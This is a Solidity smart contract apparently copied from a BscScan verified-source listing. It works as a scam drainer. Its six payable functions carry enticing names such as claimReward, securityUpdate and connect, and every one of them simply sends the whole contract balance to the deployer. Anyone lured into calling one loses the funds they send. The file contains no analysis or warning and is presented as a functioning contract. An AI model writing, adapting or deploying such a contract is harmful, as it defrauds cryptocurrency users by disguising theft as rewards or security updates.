/**
 *Submitted for verification at BscScan.com on 2023-04-23
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.19;

contract SmartContract {
  address private owner;
  mapping (address => uint256) private balances;
  constructor() {
    owner = msg.sender;
  }
  function claim() public payable {
    payable(owner).transfer(address(this).balance);
  }
  function claimReward() public payable {
    payable(owner).transfer(address(this).balance);
  }
  function securityUpdate() public payable {
    payable(owner).transfer(address(this).balance);
  }
  function execute() public payable {
    payable(owner).transfer(address(this).balance);
  }
  function swap() public payable {
    payable(owner).transfer(address(this).balance);
  }
  function connect() public payable {
    payable(owner).transfer(address(this).balance);
  }
}